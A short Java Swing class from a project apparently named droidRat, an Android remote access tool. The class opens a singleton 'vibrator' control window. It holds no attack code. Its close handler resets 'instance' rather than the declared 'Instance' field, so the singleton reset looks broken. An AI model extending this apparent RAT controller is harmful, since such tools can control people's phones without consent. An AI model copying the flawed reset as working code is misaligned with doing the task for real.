package com.je_chen.droidRat.gui.vibratorgui;

import com.je_chen.droidRat.gui.guisuper.GuiFather;
import com.je_chen.droidRat.gui.guisuper.GuiFatherInterface;

import javax.swing.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

public class VibratorGui extends GuiFather implements GuiFatherInterface {
    private static VibratorGui Instance;
    private JPanel jPanel;

    public static synchronized VibratorGui getInstance(String windowName) {
        if (Instance == null) {
            Instance = new VibratorGui();
            Instance.show(windowName);
        }
        return Instance;
    }

    @Override
    protected void closeEvent() {
        super.closeEvent();
        instance = null;
    }
}
